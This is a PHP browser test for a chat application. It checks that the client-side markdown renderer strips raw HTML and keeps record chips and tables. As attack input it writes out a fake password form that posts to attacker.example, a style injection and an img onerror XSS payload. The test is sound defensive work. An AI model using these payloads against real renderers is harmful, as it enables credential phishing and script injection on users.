<?php

declare(strict_types=1);

use App\Models\User;
use Illuminate\Support\Str;
use Tests\Helpers\ChatBrowser;

/**
 * The server renders assistant markdown with CommonMark's `html_input => 'strip'`.
 * window.renderMarkdown must agree: DOMPurify's default profile keeps <form>,
 * <input>, <button> and <style>, which is enough to paint a working credential
 * form inside the transcript that then disappears on reload. It must also keep
 * rendering what the server DOES emit: record chips and tables.
 */
it('strips raw HTML the server strips while keeping chips and tables', function (): void {
    $user = User::factory()->withTeam()->create();
    $team = $user->ownedTeams()->first();
    $conversationId = (string) Str::uuid7();
    ChatBrowser::seedConversation($user, $team->getKey(), 'sanitizer', $conversationId);

    $page = ChatBrowser::logIn($user, $team->slug, $conversationId);

    $result = $page->script(<<<'JS'
        (() => {
            if (typeof window.renderMarkdown !== 'function') return { missing: true };

            const attack = window.renderMarkdown(
                'Hello\n\n<form action="https://attacker.example/steal" method="post">'
                + '<input name="pw"><button>Go</button></form>\n\n'
                + '<style>body{outline:9px solid lime}</style>\n\n'
                + '<img src=x onerror="window.__xssFired = 1">'
            );
            const chip = window.renderMarkdown('See [Acme Robotics](/r/company/01ABC) for details.');
            const table = window.renderMarkdown('| A | B |\n| - | - |\n| 1 | 2 |');

            return {
                missing: false,
                form: /<form/i.test(attack),
                input: /<input/i.test(attack),
                button: /<button/i.test(attack),
                style: /<style/i.test(attack),
                onerror: /onerror/i.test(attack),
                xssFired: window.__xssFired === 1,
                chipRendered: /chat-chip/.test(chip) && /href="\/r\/company\/01ABC"/.test(chip) && /Acme Robotics/.test(chip),
                tableWrapped: /chat-md-table/.test(table) && /<th/.test(table),
            };
        })()
    JS);

    expect($result['missing'])->toBeFalse()
        ->and($result['form'])->toBeFalse()
        ->and($result['input'])->toBeFalse()
        ->and($result['button'])->toBeFalse()
        ->and($result['style'])->toBeFalse()
        ->and($result['onerror'])->toBeFalse()
        ->and($result['xssFired'])->toBeFalse()
        ->and($result['chipRendered'])->toBeTrue()
        ->and($result['tableWrapped'])->toBeTrue();
});
